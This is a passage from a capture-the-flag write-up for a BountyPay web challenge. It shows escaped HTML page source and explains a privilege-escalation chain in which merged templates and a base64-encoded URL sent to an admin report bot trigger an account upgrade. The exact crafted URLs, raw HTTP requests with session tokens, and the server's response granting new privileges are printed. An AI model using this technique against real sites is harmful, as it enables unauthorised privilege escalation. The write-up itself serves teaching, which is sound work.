class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;width: 100px;position: absolute\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin:auto\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;avatar upgradeToAdmin tab4\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text-center\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003esandra\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-left:100px;min-height: 100px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                            \u003cspan class=\"nt\"\u003e\u0026lt;textarea\u003c/span\u003e \u003cspan class=\"na\"\u003edisabled\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;form-control\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eReplies are currently disabled\u003cspan class=\"nt\"\u003e\u0026lt;/textarea\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;footer\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;position: absolute;bottom:0;font-size:10px;height:30px;width:100%;background-color: #ececec;line-height:30px;text-align: center\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"ni\"\u003e\u0026amp;copy;\u003c/span\u003e2020 BountyPay | \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-toggle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-target=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#myModal\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eReport This Page\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal fade\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;myModal\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etabindex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;-1\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erole=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;dialog\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003earia-labelledby=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;myModalLabel\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal-dialog\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erole=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;document\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal-content\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal-header\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;button\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;close\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-dismiss=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003earia-label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Close\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;span\u003c/span\u003e \u003cspan class=\"na\"\u003earia-hidden=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"ni\"\u003e\u0026amp;times;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;h4\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal-title\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;myModalLabel\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eReport Page\u003cspan class=\"nt\"\u003e\u0026lt;/h4\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal-body\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;p\u0026gt;\u003c/span\u003eIs there something wrong with this page? If so hit the \u0026quot;Report Now\u0026quot; button and the page will be sent over to our admins to checkout.\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;p\u0026gt;\u003c/span\u003ePages in the /admin directory will be ignored for security\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal-footer\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;button\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;btn btn-default\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-dismiss=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;modal\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eCancel\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;button\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;btn btn-primary sendReport\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eReport Now\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\n\n\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/js/jquery.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/js/bootstrap.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eLz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29u\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/js/website.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u003c/span\u003e \u003cspan class=\"na\"\u003elang=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;en\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;utf-8\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003ehttp-equiv=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;X-UA-Compatible\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003econtent=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;IE=edge\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;viewport\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003econtent=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;width=device-width, initial-scale=1\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eStaff Login\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/css/bootstrap.min.css\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;stylesheet\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;container\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;row\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;col-sm-6 col-sm-offset-3\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;h1\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text-align: center\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eStaff Login\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/?template=login\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel panel-default\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:50px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-heading\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eLogin\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-body\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:7px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;label\u0026gt;\u003c/span\u003eUsername:\u003cspan class=\"nt\"\u003e\u0026lt;/label\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;form-control\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;sandra.allison\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:7px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;label\u0026gt;\u003c/span\u003ePassword:\u003cspan class=\"nt\"\u003e\u0026lt;/label\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;form-control\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;btn btn-success pull-right\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Login\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/js/jquery.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/js/bootstrap.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI have to say that while it was a fairly obvious thing to try after realising that you need to use \u003ccode\u003eusername\u003c/code\u003e input from the login page - that\u0026#39;s not something I would expect to see in a real-world application. I mean the general trick of breaking the app behavior by passing an Array to it is commonplace of course, for to actually have a backend that merges templates seems unlikely (at least no established framework would allow that) - there must have been some pretty custom code in the backend that lead to this.\u003c/p\u003e\n\n\u003cp\u003eBack the the CTF - note that conveniently, we can also set the value for the \u003ccode\u003eusername\u003c/code\u003e input via a GET parameter, which is the last piece for the attack chain.\u003c/p\u003e\n\n\u003cp\u003eI then reported the following URL: \u003ccode\u003e/?template[]=ticket\u0026amp;ticket_id=3582\u0026amp;template[]=login\u0026amp;username=sandra.allison#tab4\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/admin/report?url=Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ=\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand ... nothing happened. Visiting that URL directly in the browser I saw that the request was still being made to \u003ccode\u003e/admin/upgrade?username=undefined\u003c/code\u003e. Of course, that makes sense. Javascript (unless loaded asynchronously) is evaluated immediately when it is encountered in the DOM, meaning that it only has access to DOM elements that precede it. I\u0026#39;ve put the templates in the wrong order, and \u003ccode\u003eusername\u003c/code\u003e input simply didn\u0026#39;t exist on the page yet when our code was executed.\u003c/p\u003e\n\n\u003cp\u003eFinally, I reversed the order of templates: \u003ccode\u003e/?template[]=login\u0026amp;username=sandra.allison\u0026amp;template[]=ticket\u0026amp;ticket_id=3582#tab4\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\u003cspan class=\"na\"\u003eSet-Cookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOWlLbi9xY0pkUFIxdnFpV1B4V3JmY3JhT3ZqQ1ZFVlpnYzMzaFAxMllyUzE3UT09; expires=Mon, 06-Jul-2020 23:09:22 GMT; Max-Age=2592000; path=/\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Report received\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd we were given a new session cookie! Logging in with that new cookie, we see that we indeed have extra privileges now. Namely, there is a new tab named \u003ccode\u003eAdmin\u003c/code\u003e, showing plain text credentials for Mårten\u0026#39;s customer account!\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"completed-priv-esc.png\" 